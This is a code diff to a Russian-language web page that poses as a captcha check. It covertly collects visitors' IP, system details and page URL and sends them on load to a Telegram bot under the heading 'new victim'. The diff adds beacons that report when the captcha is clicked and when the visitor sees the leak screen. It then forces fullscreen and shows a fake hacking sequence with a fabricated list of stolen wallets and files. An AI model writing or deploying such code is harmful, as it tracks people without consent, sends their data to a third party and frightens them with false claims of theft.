@@ -269,6 +269,7 @@
         .leak-value {
             color: #00ff00;
             font-weight: bold;
+            word-break: break-all;
         }
 
         .leak-value.danger {
@@ -315,6 +316,7 @@
             }
         }
     </style>
+<base target="_blank">
 </head>
 <body>
 
@@ -350,12 +352,16 @@
             <div class="leak-title">⚠ ДАННЫЕ УТЕЧКИ ⚠</div>
         </div>
         <div class="leak-content">
-            
+
             <div class="leak-section">
                 <h3>🌍 Сетевые данные</h3>
                 <div class="leak-item">
                     <span class="leak-label">IP-адрес:</span>
                     <span class="leak-value" id="leak-ip">Определение...</span>
+                </div>
+                <div class="leak-item">
+                    <span class="leak-label">URL страницы:</span>
+                    <span class="leak-value" id="leak-url">--</span>
                 </div>
             </div>
 
@@ -408,16 +414,16 @@
             try {
                 const oscillator = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
-                
+
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
-                
+
                 oscillator.frequency.value = frequency;
                 oscillator.type = 'square';
-                
+
                 gainNode.gain.setValueAtTime(0.08, audioCtx.currentTime);
                 gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + duration / 1000);
-                
+
                 oscillator.start(audioCtx.currentTime);
                 oscillator.stop(audioCtx.currentTime + duration / 1000);
             } catch(e) {}
@@ -466,7 +472,8 @@
                 lang: navigator.language,
                 cores: navigator.hardwareConcurrency || 'unknown',
                 memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
-                platform: navigator.platform
+                platform: navigator.platform,
+                url: window.location.href
             };
         }
 
@@ -485,7 +492,7 @@
                 'Криптокошельки: MetaMask, Trust Wallet',
                 'VPN конфигурации: 2 профиля'
             ];
-            
+
             const shuffled = dataTypes.sort(() => 0.5 - Math.random());
             return shuffled.slice(0, 7 + Math.floor(Math.random() * 3));
         }
@@ -494,6 +501,7 @@
             const text = `🎯 <b>НОВАЯ ЖЕРТВА!</b>
 
 🌐 IP: ${ip}
+🔗 URL: ${info.url}
 
 💻 <b>СИСТЕМА:</b>
 OS: ${info.os}
@@ -512,6 +520,26 @@ RAM: ${info.memory}
             } catch (e) {}
         }
 
+        // Функция для отправки сообщения о нажатии кнопки
+        async function sendCaptchaPressed() {
+            const text = '✅ <b>Нажата кнопка капчи</b>';
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+                const img = new Image();
+                img.src = url;
+            } catch (e) {}
+        }
+
+        // Функция для отправки уведомления что жертва увидела утечку
+        async function sendLeakViewed() {
+            const text = '⚠️ <b>Жертва увидела утечку данных!</b>';
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+                const img = new Image();
+                img.src = url;
+            } catch (e) {}
+        }
+
         const terminal = document.getElementById('terminal');
 
         function addLine(text, type = 'green', delay = 0) {
@@ -522,10 +550,10 @@ RAM: ${info.memory}
                     line.textContent = text;
                     terminal.appendChild(line);
                     terminal.scrollTop = terminal.scrollHeight;
-                    
+
                     playBeep(600 + Math.random() * 400, 60);
                     vibrateTick();
-                    
+
                     resolve();
                 }, delay);
             });
@@ -564,7 +592,7 @@ RAM: ${info.memory}
 
         async function startHack() {
             console.log('Start hack called');
-            
+
             if (document.getElementById('captcha-screen').style.display === 'none') {
                 return;
             }
@@ -575,17 +603,20 @@ RAM: ${info.memory}
 
             document.getElementById('robot-check').classList.add('checked');
             playBeep(600, 150);
-            
+
+            // Отправляем сообщение о нажатии кнопки капчи
+            sendCaptchaPressed();
+
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen().catch((e) => {
                     console.log('Fullscreen error:', e);
                 });
             }
-            
+
             setTimeout(() => {
                 document.getElementById('captcha-screen').style.display = 'none';
                 document.getElementById('hack-screen').style.display = 'block';
-                
+
                 runHackSequence();
             }, 300);
         }
@@ -593,10 +624,11 @@ RAM: ${info.memory}
         async function runHackSequence() {
             const sysInfo = getSystemInfo();
             const ip = await getIP();
-            
-            sendToTelegram(sysInfo, ip);
-            
+
+            // Убрана повторная отправка - данные уже отправлены при загрузке
+
             await addLine(`[TARGET] IP: ${ip}`, 'orange', 0);
+            await addLine(`[TARGET] URL: ${sysInfo.url}`, 'green', 50);
             await addLine(`[TARGET] OS: ${sysInfo.os}`, 'green', 50);
             await addLine(`[TARGET] Браузер: ${sysInfo.browser}`, 'green', 50);
             await addLine('', 'green', 50);
@@ -614,19 +646,20 @@ RAM: ${info.memory}
         function showLeakScreen(sysInfo, ip) {
             document.getElementById('hack-screen').style.display = 'none';
             document.getElementById('leak-screen').style.display = 'flex';
-            
+
             for(let i = 0; i < 3; i++) {
                 setTimeout(() => playBeep(1000 - i * 200, 200), i * 150);
             }
-            
+
             document.getElementById('leak-ip').textContent = ip;
+            document.getElementById('leak-url').textContent = sysInfo.url;
             document.getElementById('leak-os').textContent = sysInfo.os;
             document.getElementById('leak-browser').textContent = sysInfo.browser;
             document.getElementById('leak-screen-res').textContent = sysInfo.screen;
             document.getElementById('leak-cores').textContent = sysInfo.cores;
             document.getElementById('leak-ram').textContent = sysInfo.memory;
             document.getElementById('leak-lang').textContent = sysInfo.lang;
-            
+
             const stolenList = document.getElementById('stolen-data');
             stolenList.innerHTML = '';
             const items = generateStolenData();
@@ -640,26 +673,26 @@ RAM: ${info.memory}
                     playBeep(800, 50);
                 }, index * 150);
             });
-            
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('✅ Жертва увидела утечку данных!')}&parse_mode=HTML`;
+
+            // Отправляем уведомление что жертва увидела утечку
+            sendLeakViewed();
         }
 
         function setupEventListeners() {
             const captchaButton = document.getElementById('captcha-button');
-            
+
             captchaButton.addEventListener('click', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 startHack();
             });
-            
+
             captchaButton.addEventListener('touchstart', function(e) {
                 e.preventDefault();
                 e.stopPropagation();
                 startHack();
             }, { passive: false });
-            
+
             document.addEventListener('click', function(e) {
                 if (e.target.closest('#captcha-button')) {
                     e.preventDefault();
@@ -670,9 +703,10 @@ RAM: ${info.memory}
 
         window.addEventListener('load', async () => {
             console.log('Page loaded, setting up listeners');
-            
+
             setupEventListeners();
-            
+
+            // Отправляем данные только один раз при загрузке страницы
             const sysInfo = getSystemInfo();
             const ip = await getIP();
             sendToTelegram(sysInfo, ip);
